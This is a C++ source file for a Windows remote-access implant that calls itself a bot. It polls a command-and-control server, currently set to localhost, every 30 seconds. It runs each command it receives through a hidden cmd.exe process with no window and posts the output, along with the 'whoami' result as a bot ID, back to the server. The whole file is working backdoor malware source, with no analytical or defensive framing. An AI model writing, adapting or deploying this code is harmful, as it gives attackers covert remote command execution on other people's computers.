#include <iostream>
#include <curl/curl.h>
#include <string>
#include <thread>
#include <chrono>
#include <windows.h>

//function to store results of running cmd for post to server
size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

//function to run a command window with no popup
//captures stdout and stderr
//any failure will return an empty string
std::string run_hidden_cmd(const std::string& cmd) {
    HANDLE hStdOutRead, hStdOutWrite;
    SECURITY_ATTRIBUTES sa{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    //make pipe to capture stdout and stderr
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        return "";
    }
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdOutput = hStdOutWrite;
    si.hStdError  = hStdOutWrite;

    //full cmd line to be ran
    std::string fullCmd = "cmd.exe /C " + cmd;

    //create process
    //this will not make any windows
    if (!CreateProcessA(nullptr, fullCmd.data(),
                        nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) {
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        return "";
    }

    //close
    CloseHandle(hStdOutWrite);

    //read the output
    char buffer[128];
    DWORD bytesRead;
    std::string output;
    while (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
    }

    //close
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    //final output
    return output;
}

//main function that utilizes curl
//get commands from c2
//post results from running them
int main() {
    //init curl, if fails will terminate 
    CURL* curl = curl_easy_init();
    if(!curl) {
        return 1;
    }

    //main while loop
    while(true) {
        //init var for cmd 
        std::string cmd_response;
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &cmd_response);
        //init var for desired seconds to wait between polls to c2
        int seconds_to_wait=30;

        //get the command
        //if the result is not good, sleeps than retries
        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            std::this_thread::sleep_for(std::chrono::seconds(seconds_to_wait));
            continue;
        }

        //run the command
        //add bot identification to output 
        std::string output;
        if (!cmd_response.empty()) {
            output = run_hidden_cmd(cmd_response);
        }
        output+="\nBot ID:\n"+run_hidden_cmd("whoami");

        //post results back to c2
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000");
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, output.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, output.size());

        std::string post_response;
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &post_response);

        res = curl_easy_perform(curl);

        //reset post state
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0L);
        curl_easy_setopt(curl, CURLOPT_POST, 0L);

        //sleep to avoid hammering c2
        std::this_thread::sleep_for(std::chrono::seconds(seconds_to_wait));
    }

    curl_easy_cleanup(curl);
    return 0;
}

//winapi entry for cmake to avoid making cmd prompt windows
int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    return main();
}